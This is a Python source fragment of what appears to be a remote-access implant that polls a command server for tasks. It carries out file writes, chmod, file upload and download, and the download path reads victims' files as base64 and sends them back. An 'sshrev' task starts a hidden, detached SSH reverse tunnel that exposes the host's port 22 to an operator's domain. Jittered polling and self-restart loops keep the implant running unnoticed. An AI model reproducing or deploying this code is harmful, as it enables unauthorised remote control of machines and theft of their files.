                VAR_remote_path = VAR_task.get('remote_path')
                result = self.FUNC_execute_download_task(VAR_remote_path)
                
            else:
                FUNC_debug_print(f"Unknown task type: {VAR_task_type}")
                result = {'error': f'Unknown task type: {VAR_task_type}', 'success': False}
            
            self.FUNC_submit_result(VAR_task_id, result, result.get('success', False))
            return result
            
        except Exception as e:
            FUNC_debug_print(f"Task execution failed: {e}")
            result = {'error': str(e), 'success': False}
            self.FUNC_submit_result(VAR_task_id, result, False)
            return result
    
    def FUNC_submit_result(self, VAR_task_id, VAR_result, VAR_success):
        try:
            VAR_data = {
                'task_id': VAR_task_id,
                'result': VAR_result,
                'success': VAR_success,
                'agent_id': self.VAR_agent_id
            }
            
            VAR_response = self.FUNC_make_request('/agent/result', VAR_data)
            
            if VAR_response:
                VAR_decrypted = self.FUNC_decrypt_response(VAR_response)
                if VAR_decrypted and VAR_decrypted.get('success'):
                    return True
            return False
            
        except Exception as e:
            FUNC_debug_print(f"Result submission failed: {e}")
            return False
    
    def FUNC_run(self):
        while self.VAR_running:
            try:
                while self.VAR_running and not self.FUNC_register_with_backoff():
                    FUNC_debug_print("Registration failed, retrying in 5 seconds...")
                    time.sleep(5)
                if not self.VAR_running:
                    break
                VAR_consecutive_failures = 0
                while self.VAR_running:
                    try:
                        VAR_task = self.FUNC_poll_for_tasks()
                        
                        if VAR_task:
                            self.FUNC_execute_task(VAR_task)
                            VAR_consecutive_failures = 0
                        else:
                            VAR_poll_sleep = self.VAR_poll_interval
                            if hasattr(self, 'VAR_use_poll_jitter') and self.VAR_use_poll_jitter:
                                VAR_jitter_amount = VAR_poll_sleep * 0.2
                                VAR_poll_sleep = random.uniform(VAR_poll_sleep - VAR_jitter_amount, VAR_poll_sleep + VAR_jitter_amount)
                                VAR_poll_sleep = max(VAR_poll_sleep, 1.0)
                            time.sleep(VAR_poll_sleep)
                        
                        VAR_consecutive_failures = 0
                        
                    except Exception as e:
                        VAR_consecutive_failures += 1
                        FUNC_debug_print(f"Polling error (#{VAR_consecutive_failures}): {e}")
                        
                        if VAR_consecutive_failures >= 3:
                            FUNC_debug_print("Multiple polling failures detected, server may be down")
                            break
                        FUNC_debug_print("Waiting 20 seconds before retry...")
                        time.sleep(20)
                
            except Exception as e:
                FUNC_error_print(f"Main loop crashed: {e}")
                time.sleep(20)
        
    def FUNC_register_with_backoff(self):
        max_wait = 60
        wait_time = 5
        
        for attempt in range(5):
            try:
                if self.FUNC_register():
                    return True
                    
                if attempt < 4:
                    time.sleep(wait_time)
                    wait_time = min(max_wait, wait_time * 1.5)
                    
            except Exception as e:
                if attempt < 4:
                    time.sleep(wait_time)
                    wait_time = min(max_wait, wait_time * 1.5)
        
        return False

    def FUNC_restart(self):
        try:
            time.sleep(2)
            
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception as e:
            FUNC_error_print(f"Failed to restart: {e}")
            try:
                import subprocess
                subprocess.Popen([sys.executable] + sys.argv)
                sys.exit(0)
            except Exception as e2:
                sys.exit(1)

    def FUNC_execute_write_task(self, VAR_path, VAR_content):
        try:
            if not VAR_path:
                return {
                    'stdout': '',
                    'stderr': 'write: no file path specified',
                    'return_code': 1,
                    'success': False
                }
            VAR_parent_dir = os.path.dirname(VAR_path)
            if VAR_parent_dir and not os.path.exists(VAR_parent_dir):
                try:
                    os.makedirs(VAR_parent_dir, exist_ok=True)
                except Exception as e:
                    return {
                        'stdout': '',
                        'stderr': f"write: cannot create directory '{VAR_parent_dir}': {str(e)}",
                        'return_code': 1,
                        'success': False
                    }
            
            try:
                with open(VAR_path, 'w', encoding='utf-8') as f:
                    f.write(VAR_content or '')
                VAR_file_size = os.path.getsize(VAR_path)
                return {
                    'stdout': f"wrote {len(VAR_content or '')} characters ({VAR_file_size} bytes) to {VAR_path}",
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f"write: {VAR_path}: Permission denied",
                    'return_code': 1,
                    'success': False
                }
            except OSError as e:
                return {
                    'stdout': '',
                    'stderr': f"write: {VAR_path}: {str(e)}",
                    'return_code': 1,
                    'success': False
                }
                
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }

    def FUNC_execute_chmod_task(self, VAR_mode, VAR_path):
        try:
            if VAR_mode is None or not VAR_path:
                return {
                    'stdout': '',
                    'stderr': 'chmod: usage: chmod <mode> <path>',
                    'return_code': 1,
                    'success': False
                }

            if isinstance(VAR_path, str) and VAR_path.startswith('~'):
                VAR_path = os.path.expanduser(VAR_path)
            VAR_path = os.path.abspath(VAR_path)

            if not os.path.exists(VAR_path):
                return {
                    'stdout': '',
                    'stderr': f'chmod: {VAR_path}: No such file or directory',
                    'return_code': 1,
                    'success': False
                }

            # Parse mode (supports strings like '755', '0755', '0o755' or integers)
            parsed_mode = None
            try:
                if isinstance(VAR_mode, str):
                    mode_str = VAR_mode.strip().lower()
                    if mode_str.startswith('0o'):
                        parsed_mode = int(mode_str, 8)
                    elif mode_str.startswith('0x'):
                        parsed_mode = int(mode_str, 16)
                    else:
                        parsed_mode = int(mode_str, 8)
                else:
                    parsed_mode = int(VAR_mode)
            except Exception:
                return {
                    'stdout': '',
                    'stderr': f'chmod: invalid mode: {VAR_mode}',
                    'return_code': 1,
                    'success': False
                }

            try:
                os.chmod(VAR_path, parsed_mode)
                human = oct(parsed_mode)[2:]
                return {
                    'stdout': f'Set permissions of {VAR_path} to {human}',
                    'stderr': '',
                    'return_code': 0,
                    'success': True
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f'chmod: {VAR_path}: Permission denied',
                    'return_code': 1,
                    'success': False
                }
            except Exception as e:
                return {
                    'stdout': '',
                    'stderr': f'chmod: {VAR_path}: {str(e)}',
                    'return_code': 1,
                    'success': False
                }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': 1,
                'success': False
            }

    def FUNC_execute_sshrev_task(self, VAR_key_path, VAR_port, VAR_user, VAR_domain):
        try:
            if not all([VAR_key_path, VAR_port, VAR_user, VAR_domain]):
                missing = []
                if not VAR_key_path: missing.append('key_path')
                if not VAR_port: missing.append('port')
                if not VAR_user: missing.append('user')
                if not VAR_domain: missing.append('domain')
                return {
                    'stdout': '',
                    'stderr': f'Missing required parameters: {", ".join(missing)}',
                    'return_code': 1,
                    'success': False
                }
            
            if not os.path.exists(VAR_key_path):
                return {
                    'stdout': '',
                    'stderr': f'Key file not found: {VAR_key_path}',
                    'return_code': 1,
                    'success': False
                }
            
            if not os.access(VAR_key_path, os.R_OK):
                return {
                    'stdout': '',
                    'stderr': f'Key file not readable: {VAR_key_path}',
                    'return_code': 1,
                    'success': False
                }
            
            VAR_ssh_command = [
                'ssh',
                '-NT',
                '-i', VAR_key_path,
                '-o', 'ExitOnForwardFailure=yes',
                '-o', 'ServerAliveInterval=60',
                '-R', f'{VAR_port}:localhost:22',
                f'{VAR_user}@{VAR_domain}'
            ]
            FUNC_debug_print(f"Establishing secure tunnel: {' '.join(VAR_ssh_command)}")
            VAR_full_command = f"nohup {' '.join(VAR_ssh_command)} >/dev/null 2>&1 & disown"
            try:
                process = subprocess.Popen(
                    VAR_full_command,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    start_new_session=True
                )
            except Exception as e:
                process = subprocess.Popen(
                    VAR_full_command,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )
            time.sleep(1)
            poll_result = process.poll()
            if poll_result is not None and poll_result != 0:
                return {
                    'stdout': '',
                    'stderr': f'Tunnel failed to start (exit code: {poll_result})',
                    'return_code': poll_result,
                    'success': False
                }
            VAR_output_message = f"Tunnel started: {VAR_user}@{VAR_domain} port {VAR_port} (detached)"
            result = {
                'stdout': VAR_output_message,
                'stderr': '',
                'return_code': 0,
                'success': True
            }
            return result
        except FileNotFoundError as e:
            return {
                'stdout': '',
                'stderr': 'Command not found',
                'return_code': 127,
                'success': False
            }
        except OSError as e:
            return {
                'stdout': '',
                'stderr': f'OS error: {str(e)}',
                'return_code': 1,
                'success': False
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': f'sshrev: SSH reverse tunnel failed: {str(e)}',
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_upload_task(self, VAR_remote_path, VAR_file_data):
        try:
            if not VAR_remote_path:
                return {
                    'stdout': '',
                    'stderr': 'upload: Remote path required',
                    'return_code': 1,
                    'success': False
                }
            
            if not VAR_file_data:
                return {
                    'stdout': '',
                    'stderr': 'upload: File data required',
                    'return_code': 1,
                    'success': False
                }
            
            try:
                VAR_file_bytes = base64.b64decode(VAR_file_data)
            except Exception as e:
                return {
                    'stdout': '',
                    'stderr': f'upload: Failed to decode file data - {str(e)}',
                    'return_code': 1,
                    'success': False
                }
            
            if VAR_remote_path.startswith('~'):
                VAR_remote_path = os.path.expanduser(VAR_remote_path)
            
            VAR_remote_path = os.path.abspath(VAR_remote_path)
            
            VAR_directory = os.path.dirname(VAR_remote_path)
            if VAR_directory and not os.path.exists(VAR_directory):
                try:
                    os.makedirs(VAR_directory, exist_ok=True)
                except Exception as e:
                    return {
                        'stdout': '',
                        'stderr': f'upload: Failed to create directory {VAR_directory} - {str(e)}',
                        'return_code': 1,
                        'success': False
                    }
            try:
                with open(VAR_remote_path, 'wb') as f:
                    f.write(VAR_file_bytes)
                VAR_file_size = len(VAR_file_bytes)
                return {
                    'stdout': f'File uploaded successfully: {VAR_remote_path} ({VAR_file_size} bytes)',
                    'stderr': '',
                    'return_code': 0,
                    'success': True,
                    'file_path': VAR_remote_path,
                    'file_size': VAR_file_size
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f'upload: Permission denied writing to {VAR_remote_path}',
                    'return_code': 1,
                    'success': False
                }
            except Exception as e:
                return {
                    'stdout': '',
                    'stderr': f'upload: Failed to write file {VAR_remote_path} - {str(e)}',
                    'return_code': 1,
                    'success': False
                }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': f'upload: Unexpected error - {str(e)}',
                'return_code': 1,
                'success': False
            }
    
    def FUNC_execute_download_task(self, VAR_remote_path):
        try:
            if not VAR_remote_path:
                return {
                    'stdout': '',
                    'stderr': 'download: Remote path required',
                    'return_code': 1,
                    'success': False
                }
            
            if VAR_remote_path.startswith('~'):
                VAR_remote_path = os.path.expanduser(VAR_remote_path)
            
            VAR_remote_path = os.path.abspath(VAR_remote_path)
            
            if not os.path.exists(VAR_remote_path):
                return {
                    'stdout': '',
                    'stderr': f'download: File not found - {VAR_remote_path}',
                    'return_code': 1,
                    'success': False
                }
            
            if not os.path.isfile(VAR_remote_path):
                return {
                    'stdout': '',
                    'stderr': f'download: Path is not a file - {VAR_remote_path}',
                    'return_code': 1,
                    'success': False
                }
            
            try:
                VAR_file_size = os.path.getsize(VAR_remote_path)
                VAR_max_size = 100 * 1024 * 1024
                if VAR_file_size > VAR_max_size:
                    return {
                        'stdout': '',
                        'stderr': f'download: File too large ({VAR_file_size} bytes, max {VAR_max_size} bytes)',
                        'return_code': 1,
                        'success': False
                    }
            except Exception as e:
                return {
                    'stdout': '',
                    'stderr': f'download: Failed to get file size - {str(e)}',
                    'return_code': 1,
                    'success': False
                }
            try:
                with open(VAR_remote_path, 'rb') as f:
                    VAR_file_bytes = f.read()
                VAR_file_data_b64 = base64.b64encode(VAR_file_bytes).decode('utf-8')
                return {
                    'stdout': f'File downloaded successfully: {VAR_remote_path} ({VAR_file_size} bytes)',
                    'stderr': '',
                    'return_code': 0,
                    'success': True,
                    'file_path': VAR_remote_path,
                    'file_size': VAR_file_size,
                    'file_data': VAR_file_data_b64,
                    'filename': os.path.basename(VAR_remote_path)
                }
            except PermissionError:
                return {
                    'stdout': '',
                    'stderr': f'download: Permission denied reading {VAR_remote_path}',
                    'return_code': 1,
                    'success': False
                }
            except Exception as e:
                return {
                    'stdout': '',
                    'stderr': f'download: Failed to read file {VAR_remote_path} - {str(e)}',
                    'return_code': 1,
                    'success': False
                }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': f'download: Unexpected error - {str(e)}',
                'return_code': 1,
                'success': False
            }

def main():
    VAR_server_url = f'{VAR_SERVER_SCHEME}://{VAR_SERVER_HOST}:{VAR_SERVER_PORT}'
    VAR_poll_interval = 10
    VAR_agent_id = None
    VAR_max_rapid_restarts = 10
    VAR_restart_window = 300
    VAR_restart_times = []
    restart_count = 0
    
    while True:
        try:
            import time as time_module
            current_time = time_module.time()
            VAR_restart_times = [t for t in VAR_restart_times if current_time - t < VAR_restart_window]
            
            if len(VAR_restart_times) >= VAR_max_rapid_restarts:
                FUNC_error_print(f"Too many restarts ({len(VAR_restart_times)}) in {VAR_restart_window} seconds")
                FUNC_error_print("Waiting 60 seconds before restart to prevent restart loop...")
                time_module.sleep(60)
                VAR_restart_times.clear()
            
            restart_count += 1
            if restart_count > 1:
                FUNC_error_print(f"Restarting (attempt #{restart_count})...")
                VAR_restart_times.append(current_time)
                time_module.sleep(5)
            
            agent = CLASS_StandaloneAgent(
                VAR_server_url=VAR_server_url,
                VAR_poll_interval=VAR_poll_interval,
                VAR_agent_id=VAR_agent_id
            )
            agent.FUNC_run()
            break
        except KeyboardInterrupt:
            break
        except SystemExit:
            break
        except Exception as e:
            FUNC_error_print(f"Crash with unhandled exception: {e}")
            FUNC_error_print(f"Exception type: {type(e).__name__}")
            import traceback
            FUNC_error_print("Traceback:")
            for line in traceback.format_exc().splitlines():
                FUNC_error_print(f"  {line}")
            continue
    
if __name__ == '__main__':
    main() 